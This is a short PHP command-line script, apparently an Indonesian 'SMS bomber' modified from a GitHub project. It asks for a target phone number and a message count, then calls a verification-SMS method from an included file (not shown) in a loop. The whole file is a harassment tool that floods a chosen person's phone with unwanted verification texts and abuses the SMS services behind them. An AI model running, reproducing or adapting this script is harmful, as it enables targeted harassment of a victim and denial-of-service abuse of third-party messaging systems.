<?
include 'bomphd.php';
/*
    https://github.com/nee48/BomSmsPhD
    made by Handika Pratama
    Modified by Mr.Mufti
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Target By Mufti(tanpa 0/62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "jumlah pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
